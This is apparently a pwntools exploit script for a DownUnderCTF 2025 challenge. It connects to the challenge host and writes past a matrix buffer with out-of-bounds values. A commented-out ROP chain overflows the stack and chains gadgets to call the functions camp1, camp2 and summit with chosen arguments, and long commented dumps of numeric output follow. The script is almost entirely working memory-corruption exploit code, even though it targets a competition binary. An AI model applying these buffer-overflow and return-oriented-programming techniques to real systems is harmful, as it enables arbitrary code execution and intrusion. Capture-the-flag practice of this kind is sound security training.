from pwn import *

context.terminal =  ["tmux", "splitw", "-h"] 
context.endian = 'little'
BINARY = "./main"
HOST = "chal.2025-us.ductf.net"
PORT = 30002

elf = ELF(BINARY)

def start_binary():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

rop = ROP(elf)

# start process
p = start_binary()

if not args.REMOTE and args.GDB:
    gdb.attach(p, """
    b* matvecmul
    c
    """)

p = start_binary()

def forward_pass(p, inp):
    p.recvuntil(b"> \n")
    p.sendline(b"2")

def send_matrix(data):
    """Send a full M x N matrix worth of inputs (A is 16x1, so 16 values),
       then continue sending out-of-bounds values to overwrite memory"""
    for value in data:
        p.sendline(str(value))

payload = []

# A (16 values)
payload += [0] * 16

# B (overwrite) - fill with marker values like 0x41 ('A')
payload += [ord('F')] * 64       # maybe overwrite B(0:15,0:3)
payload += [ord('L')] * 64
payload += [ord('A')] * 64
payload += [ord('G')] * 64

forward_pass(p, "h")
send_matrix(payload)
p.interactive()
# print transform
#     0
#   211
#    48
#    39
#   252
#    19
#     2
#     2
#   144
#   105
#   250
#   228
#   146
#   192
#   206
#   216
#    81
#   211
#    48
#    39
#   252
#    19
#     2
#     2
#   144
#   105
#   250
#   228
#   146
#   192
#   206
#   216
#    81
#    61
#   194
#    94
#    64
#   108
#   106
#   230
#    14
#    96
#   251
#    55
#   120
#   152
#   248
#    93
#   174
#    81
#    82
#    46
#   173
#   222
#   167
#   219
#   206
#    87
#   141
#    82
#   213
#   164
#    39
#   188
#   246
#   128
#     1
#   112
#   106
#   197
#   121
#    22
#   134
#    49
#   173
#   192
#   166
#   100
#    22
#   222
#   244
#   107
#   130
#   156
#   154
#   207
#     9
#    24
#    76
#   238
#   172
#   134
#   105
#    41
#   203
#    42
#   255
#    23
#   160
#   180
#     2
#    37
#    15
#   100
#   132
#    92
#   233
#    63
#   139
#   216
#    36
#   146
#   206
#    97
#    14
#    85
#   193
#   139
#    79
#     3
#   137
#    90
#   190
#   229
#    63
#   251
#    99
#   200
#   194
#   133
#    83
#   164
#   196
#    54
#   184
#   168
#    28
#   138
#    69
#    94
#    92
#   171
#   160
#    60
#   228
#   198
#   247
#    10
#   180
#    57
#    79
#    11
#     5
#    95
#   129
#    79
#   103
#    56
#   229
#   130
#   237
#   163
#   126
#    30
#   114
#    18
#   223
#   138
#   157
#    96
#   135
#    54
#   190
#    26
#   241
#   190
#   151
#    97
#    88
#   123
#   181
#   153
#   223
#   192
#    42
#   218
#   177
#   114
#   222
#   226
#   114
#   194
#    65
#   239
#    62
#   239
#   185
#   140
#   176
#   176
#    81
#    41
#    17
#   111
#    25
#   202
#   231
#   161
#   132
#   110
#   194
#   140
#   125
#   225
#   163
#    85
#   169
#   167
#   167
#   159
#   111
#   164
#    93
#    50
#   170
#    70
#   192
#   179
#    46
#   207
#   203
#    40
#   143
#   100
#    21
#   179
#   233
#   204
#   144
#   203
#   238
#    17
#   196
#   174
#   228
#     4
#   229
#    90
#   254
#   122
#    34
#    64
#    38
#    99
#   165
#   132

# backward pass
#   248
#   140
#   171
#   129
#   220
#    10
#   190
#    32
#    58
#    38
#    96
#    72
#    84
#   197
#    69
#   204

# POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
# RET = (rop.find_gadget(['ret']))[0]
# CAMP1 = elf.symbols['camp1']
# CAMP2 = elf.symbols['camp2']
# SUMMIT = elf.symbols['summit']
# MAIN = elf.symbols['main']
# POP_RSI = (rop.find_gadget(['pop rsi', 'ret']))[0]
# log.info("CAMP1 func: " + hex(CAMP1))
# log.info("CAMP2 func: " + hex(CAMP2))
# log.info("SUMMIT func: " + hex(SUMMIT))
# log.info("MAIN func: " + hex(MAIN))
# log.info("pop rdi gadget: " + hex(POP_RDI))
# log.info("pop rsi gadget: " + hex(POP_RSI))
# log.info("ret: " + hex(RET))

# # run process until it encounters help?)
# p.recvuntil(b"help?)\n")

# payload = b"A"*56 # Overflows the stack by 48 then add 8 bytes for stack alignment
# payload += p64(RET) # jump return instruction because remote is weird
# payload += p64(CAMP1) # jump to the camp1 function
# payload += p64(RET) # jump to the camp1 function
# # payload += p64(MAIN)
# payload += p64(POP_RDI) # once camp1 returns jump to POP_RDI instruction
# payload += b"g" + b"A"*7 # camp2 requires register al to be the letter g so put that first and then pad by 7 bytes
# payload += p64(CAMP2) # jump to camp2 function
# payload += p64(POP_RDI) # need to jump back to another POP_RDI so the letter c is put in the lower rdi register
# payload += b"c" + b"A"*7 
# payload += p64(POP_RSI) # jump to a pop rsi instruction for the next if check in summit
# payload += b"tf" + b"A"*6
# payload += p64(SUMMIT) # jump to the summit function
# p.sendline(payload)
# print(p.recv())


# test = [179, 119, 124, 29, 178, 103, 155, 158, 142, 187, 168, 113, 128, 197, 53, 133]
# for i in test:
#     print(chr(i))